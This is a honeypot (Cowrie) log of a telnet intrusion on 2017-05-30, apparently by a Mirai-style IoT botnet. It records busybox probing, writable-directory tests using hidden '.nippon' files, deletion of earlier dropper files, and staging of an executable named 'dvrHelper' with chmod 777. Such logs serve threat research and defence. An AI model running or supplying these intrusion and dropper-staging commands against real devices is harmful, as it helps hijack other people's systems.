2017-05-30T21:40:14+0000 [-] unauthorized login: 
2017-05-30T21:40:14+0000 [twisted.internet.defer#critical] Unhandled error in Deferred:
2017-05-30T21:40:14+0000 [twisted.internet.defer#critical] 
	Traceback (most recent call last):
	  File "/home/cowrie/cowrie/cowrie-env/local/lib/python2.7/site-packages/twisted/internet/base.py", line 1252, in mainLoop
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox ps
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: ps
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox ECCHI
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] CMD: /bin/busybox cat /proc/mounts; /bin/busybox ECCHI
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox cat /proc/mounts
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: cat /proc/mounts
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox ECCHI
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69' > /.nippon; /bin/busybox cat /.nippon; /bin/busybox rm /.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69' > /.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: echo -e '\x6b\x61\x6d\x69'
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox cat /.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: cat /.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox rm /.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/sys' > /sys/.nippon; /bin/busybox cat /sys/.nippon; /bin/busybox rm /sys/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/sys' > /sys/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: echo -e '\x6b\x61\x6d\x69/sys'
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox cat /sys/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: cat /sys/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox rm /sys/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /sys/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/proc' > /proc/.nippon; /bin/busybox cat /proc/.nippon; /bin/busybox rm /proc/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/proc' > /proc/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: echo -e '\x6b\x61\x6d\x69/proc'
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox cat /proc/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: cat /proc/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox rm /proc/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /proc/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/dev' > /dev/.nippon; /bin/busybox cat /dev/.nippon; /bin/busybox rm /dev/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/dev' > /dev/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: echo -e '\x6b\x61\x6d\x69/dev'
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox cat /dev/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: cat /dev/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox rm /dev/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /dev/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/dev/pts' > /dev/pts/.nippon; /bin/busybox cat /dev/pts/.nippon; /bin/busybox rm /dev/pts/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/dev/pts' > /dev/pts/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: echo -e '\x6b\x61\x6d\x69/dev/pts'
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox cat /dev/pts/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: cat /dev/pts/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox rm /dev/pts/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /dev/pts/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/run' > /run/.nippon; /bin/busybox cat /run/.nippon; /bin/busybox rm /run/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/run' > /run/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: echo -e '\x6b\x61\x6d\x69/run'
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox cat /run/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: cat /run/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox rm /run/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /run/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69' > /.nippon; /bin/busybox cat /.nippon; /bin/busybox rm /.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69' > /.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: echo -e '\x6b\x61\x6d\x69'
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox cat /.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: cat /.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox rm /.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/dev/shm' > /dev/shm/.nippon; /bin/busybox cat /dev/shm/.nippon; /bin/busybox rm /dev/shm/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/dev/shm' > /dev/shm/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: echo -e '\x6b\x61\x6d\x69/dev/shm'
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox cat /dev/shm/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: cat /dev/shm/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox rm /dev/shm/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /dev/shm/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/run/lock' > /run/lock/.nippon; /bin/busybox cat /run/lock/.nippon; /bin/busybox rm /run/lock/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/run/lock' > /run/lock/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: echo -e '\x6b\x61\x6d\x69/run/lock'
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox cat /run/lock/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: cat /run/lock/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox rm /run/lock/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /run/lock/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/proc/sys/fs/binfmt_misc' > /proc/sys/fs/binfmt_misc/.nippon; /bin/busybox cat /proc/sys/fs/binfmt_misc/.nippon; /bin/busybox rm /proc/sys/fs/binfmt_misc/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/proc/sys/fs/binfmt_misc' > /proc/sys/fs/binfmt_misc/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: echo -e '\x6b\x61\x6d\x69/proc/sys/fs/binfmt_misc'
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox cat /proc/sys/fs/binfmt_misc/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: cat /proc/sys/fs/binfmt_misc/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox rm /proc/sys/fs/binfmt_misc/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /proc/sys/fs/binfmt_misc/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/sys/fs/fuse/connections' > /sys/fs/fuse/connections/.nippon; /bin/busybox cat /sys/fs/fuse/connections/.nippon; /bin/busybox rm /sys/fs/fuse/connections/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/sys/fs/fuse/connections' > /sys/fs/fuse/connections/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox cat /sys/fs/fuse/connections/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: cat /sys/fs/fuse/connections/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox rm /sys/fs/fuse/connections/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /sys/fs/fuse/connections/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/boot' > /boot/.nippon; /bin/busybox cat /boot/.nippon; /bin/busybox rm /boot/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/boot' > /boot/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: echo -e '\x6b\x61\x6d\x69/boot'
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox cat /boot/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: cat /boot/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox rm /boot/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /boot/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/home' > /home/.nippon; /bin/busybox cat /home/.nippon; /bin/busybox rm /home/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/home' > /home/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: echo -e '\x6b\x61\x6d\x69/home'
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox cat /home/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: cat /home/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox rm /home/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /home/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/proc/sys/fs/binfmt_misc' > /proc/sys/fs/binfmt_misc/.nippon; /bin/busybox cat /proc/sys/fs/binfmt_misc/.nippon; /bin/busybox rm /proc/sys/fs/binfmt_misc/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/proc/sys/fs/binfmt_misc' > /proc/sys/fs/binfmt_misc/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: echo -e '\x6b\x61\x6d\x69/proc/sys/fs/binfmt_misc'
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox cat /proc/sys/fs/binfmt_misc/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: cat /proc/sys/fs/binfmt_misc/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox rm /proc/sys/fs/binfmt_misc/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /proc/sys/fs/binfmt_misc/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/dev' > /dev/.nippon; /bin/busybox cat /dev/.nippon; /bin/busybox rm /dev/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/dev' > /dev/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: echo -e '\x6b\x61\x6d\x69/dev'
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox cat /dev/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: cat /dev/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox rm /dev/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /dev/.nippon
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] CMD: /bin/busybox ECCHI
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: /bin/busybox ECCHI
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] CMD: rm /.t; rm /.sh; rm /.human
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /.t
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /.sh
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /.human
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] CMD: rm /sys/.t; rm /sys/.sh; rm /sys/.human
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /sys/.t
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /sys/.sh
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /sys/.human
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] CMD: rm /proc/.t; rm /proc/.sh; rm /proc/.human
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /proc/.t
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /proc/.sh
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /proc/.human
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] CMD: rm /dev/.t; rm /dev/.sh; rm /dev/.human
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /dev/.t
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /dev/.sh
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /dev/.human
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] CMD: rm /dev/pts/.t; rm /dev/pts/.sh; rm /dev/pts/.human
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /dev/pts/.t
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /dev/pts/.sh
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /dev/pts/.human
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] CMD: rm /run/.t; rm /run/.sh; rm /run/.human
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /run/.t
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /run/.sh
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /run/.human
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] CMD: rm /.t; rm /.sh; rm /.human
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /.t
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /.sh
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /.human
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] CMD: rm /dev/shm/.t; rm /dev/shm/.sh; rm /dev/shm/.human
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /dev/shm/.t
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /dev/shm/.sh
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /dev/shm/.human
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] CMD: rm /run/lock/.t; rm /run/lock/.sh; rm /run/lock/.human
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /run/lock/.t
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /run/lock/.sh
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /run/lock/.human
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] CMD: rm /proc/sys/fs/binfmt_misc/.t; rm /proc/sys/fs/binfmt_misc/.sh; rm /proc/sys/fs/binfmt_misc/.human
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /proc/sys/fs/binfmt_misc/.t
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /proc/sys/fs/binfmt_misc/.sh
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /proc/sys/fs/binfmt_misc/.human
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] CMD: rm /boot/.t; rm /boot/.sh; rm /boot/.human
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /boot/.t
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /boot/.sh
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /boot/.human
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] CMD: rm /home/.t; rm /home/.sh; rm /home/.human
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /home/.t
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /home/.sh
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /home/.human
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] CMD: rm /proc/sys/fs/binfmt_misc/.t; rm /proc/sys/fs/binfmt_misc/.sh; rm /proc/sys/fs/binfmt_misc/.human
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /proc/sys/fs/binfmt_misc/.t
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /proc/sys/fs/binfmt_misc/.sh
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /proc/sys/fs/binfmt_misc/.human
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] CMD: rm /dev/.t; rm /dev/.sh; rm /dev/.human
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /dev/.t
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /dev/.sh
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: rm /dev/.human
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] CMD: cd /
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] Command found: cd /
2017-05-30T21:40:42+0000 [CowrieTelnetTransport,492,45.76.143.151] CMD: /bin/busybox cp /bin/echo dvrHelper; >dvrHelper; /bin/busybox chmod 777 dvrHelper; /bin/busybox ECCHI
